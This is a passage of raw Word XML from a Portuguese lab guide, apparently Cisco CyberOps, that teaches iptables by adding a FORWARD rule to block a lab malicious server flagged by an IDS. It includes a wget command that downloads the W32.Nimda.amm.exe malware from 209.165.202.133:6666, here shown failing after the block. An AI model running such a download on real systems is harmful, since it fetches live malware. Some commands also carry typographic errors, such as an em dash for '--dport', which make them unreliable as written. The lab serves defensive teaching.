      </w:r>
      <w:r w:rsidRPr="00B2177E">
        <w:t>: A análise do arquivo PCAP será realizada em outro laboratório.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FF4236" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00D74394" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Ajustar regras de firewall com base em alertas IDS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9BCB8A" w14:textId="16A5E880" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t>Na Etapa 1, você iniciou um servidor mal-intencionado baseado na Internet. Para impedir que outros usuários acessem esse servidor, é recomendável bloqueá-lo no firewall de borda.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DC3046" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t>Na topologia deste laboratório, o</w:t>
      </w:r>
      <w:r w:rsidRPr="004C70B3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> não está apenas executando um IDS, mas também um firewall baseado em Linux muito popular chamado </w:t>
      </w:r>
      <w:r w:rsidRPr="004C70B3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>iptables</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Nesta etapa, você bloqueará o tráfego para o servidor mal-intencionado identificado na Etapa 1 editando as regras de firewall atualmente presentes no </w:t>
      </w:r>
      <w:r w:rsidRPr="004C70B3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24349751" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nota</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Embora um estudo abrangente de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>iptables</w:t>
      </w:r>
      <w:r w:rsidRPr="007F0B6F">
        <w:t xml:space="preserve"> esteja além do escopo deste curso, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="007F0B6F">
        <w:t xml:space="preserve"> lógica básica iptables e a estrutura de regras são bastante simples.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109DC683" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t>O firewall</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> iptables</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> usa os conceitos de</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42A85">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> chains (cadeias)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r w:rsidRPr="00F42A85">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>regras</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para filtrar o tráfego. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD53907" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">O tráfego que entra no firewall e destinado ao próprio dispositivo de firewall é tratado pela chain </w:t>
      </w:r>
      <w:r w:rsidRPr="00AE7B09">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>INPUT</w:t>
      </w:r>
      <w:r>
        <w:t>. Exemplos desse tráfego são pacotes de ping provenientes de qualquer outro dispositivo em qualquer rede e enviados para qualquer uma das interfaces do firewall.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F9862E" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">O tráfego originado no próprio dispositivo de firewall e destinado a outro lugar é tratado pela chain </w:t>
      </w:r>
      <w:r w:rsidRPr="00AE7B09">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OUTPUT</w:t>
      </w:r>
      <w:r>
        <w:t>. Exemplos desse tráfego são respostas de ping geradas pelo próprio dispositivo de firewall.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9D54DF" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">O tráfego originou-se em outro lugar e a passagem pelo dispositivo de firewall é manipulada pela chain </w:t>
      </w:r>
      <w:r w:rsidRPr="00AE7B09">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FORWARD</w:t>
      </w:r>
      <w:r>
        <w:t>. Exemplos desse tráfego são pacotes sendo roteados pelo firewall.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACDD7C4" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t>Cada chain pode ter seu próprio conjunto de regras independentes especificando como o tráfego deve ser filtrado para essa chain. Uma chain pode ter praticamente qualquer número de regras, incluindo nenhuma regra.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65DB4222" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL25"/>
      </w:pPr>
      <w:r>
        <w:t>As regras são criadas para verificar características específicas dos pacotes, permitindo que os administradores criem filtros muito abrangentes. Se um pacote não corresponder a uma regra, o firewall passa para a próxima regra e verifica novamente. Se uma correspondência for encontrada, o firewall executará a ação definida na regra de correspondência. Se todas as regras em uma chain tiverem sido verificadas e ainda nenhuma correspondência foi encontrada, o firewall executará a ação especificada na política da chain, geralmente permite que o pacote flua ou negue.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2784FA94" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Na </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>VM CyberOps Workstation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, inicie uma terceira janela de terminal R1. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338DCCA5" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">mininet &gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>xterm R1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F0975A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A71BE4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Na nova janela do terminal </w:t>
      </w:r>
      <w:r w:rsidRPr="004C70B3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, use o comando </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>iptables</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para listar as chain e suas regras atualmente em uso:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65EB477D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps ~] #</w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> iptables -L -v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E22608D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Chain INPUT (policy ACCEPT 0 packets, 0 bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DEC867" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A71BE4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> pkts bytes target prot opt in out source destination         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BB06B0" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A71BE4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59FC5DA9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A71BE4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Chain FORWARD (policy ACCEPT 6 packets, 504 bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A2006D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A71BE4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> pkts bytes target prot opt in out source destination         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF71BE0" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A71BE4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68F56F1C" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A71BE4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB4866D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A71BE4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> pkts bytes target prot opt in out source destination         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A95C3BC" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00A71BE4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E82EFB9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps ~] #</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1746E204" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Pergunta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50333950" w14:textId="71B3BC2C" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Quais chain estão atualmente em uso pelo </w:t>
      </w:r>
      <w:r w:rsidRPr="004C70B3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582A993D" w14:textId="60CE001F" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75459791" w14:textId="09840D53" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D490C9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Conexões com o servidor mal-intencionado geram pacotes que devem transverter o firewall </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2358D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">iptables </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">no </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2358D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Os pacotes que atravessam o firewall são tratados pela regra FORWARD e, portanto, essa é a chain que receberá a regra de bloqueio. Para impedir que os computadores do usuário se conectem ao servidor mal-intencionado identificado na Etapa 1, adicione a seguinte regra à chain FORWARD no </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2358D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC33348" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps ~] #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> iptables -I FORWARD -p tcp -d 209.165.202.133 —dport 6666 -j DROP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9316D6" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps ~] #</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE00D19" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Onde:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34634D94" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Bulletlevel2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-I FORWARD</w:t>
      </w:r>
      <w:r w:rsidRPr="006B299C">
        <w:t>: insere uma nova regra na chain FORWARD.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A3E3E8" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Bulletlevel2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-p tcp</w:t>
      </w:r>
      <w:r w:rsidRPr="006B299C">
        <w:t>: especifica o protocolo TCP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6B1D84" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Bulletlevel2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-d 209.165.202.133</w:t>
      </w:r>
      <w:r w:rsidRPr="006B299C">
        <w:t>: especifica o destino do pacote</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A580973" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Bulletlevel2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>—dport 6666</w:t>
      </w:r>
      <w:r w:rsidRPr="006B299C">
        <w:t>: especifica a porta de destino</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E6F58F8" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Bulletlevel2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-j DROP</w:t>
      </w:r>
      <w:r w:rsidRPr="006B299C">
        <w:t>: define a ação para soltar.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B4F3EB" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use o comando </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>iptables</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> novamente para garantir que a regra foi adicionada à chain FORWARD. A VM CyberOps Workstation pode levar alguns segundos para gerar a saída:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38FE3F56" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps analyst] #</w:t>
      </w:r>
      <w:r w:rsidRPr="00F664DD">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> iptables -L -v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD08C3B" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Chain INPUT (policy ACCEPT 0 packets, 0 bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A06509" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> pkts bytes target prot opt in out source destination         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F50ED8D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EB6078C" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284C7115" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> pkts bytes target prot opt in out source destination         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179B09C6" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">    0 0 DROP tcp -- any any anywhere 209.165.202.133 tcp dpt:6666</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D2ADEC" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A670B07" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1EF2A5" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> pkts bytes target prot opt in out source destination         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644F7B61" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[root@secOps analyst]# </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583D3777" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Em </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H5</w:t>
      </w:r>
      <w:r>
        <w:t>, tente baixar o arquivo novamente:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F85BA67" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps analyst] #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> wget 209.165.202. 133:6666 /W32.Nimda.amm.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="084CEA06" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C77053" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>--2017-05-01 14:42:37-- http://209.165.202.133:6666/W32.Nimda.Amm.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BA8B2D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C77053" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Connecting to 209.165.202.133:6666... failed: Connection timed out.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5479EA27" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C77053" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Retrying.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6418CBD5" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C77053" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26509946" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C77053" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>--2017-05-01 14:44:47-- (try: 2) http://209.165.202.133:6666/W32.Nimda.Amm.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D14E5AC" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C77053" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Connecting to 209.165.202.133:6666... failed: Connection timed out.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BBF01F" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C77053" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Retrying.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06797A02" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Digite </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ctrl+C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para cancelar o download, se necessário.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E74680" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Perguntas:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F799D2" w14:textId="473D4E07" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
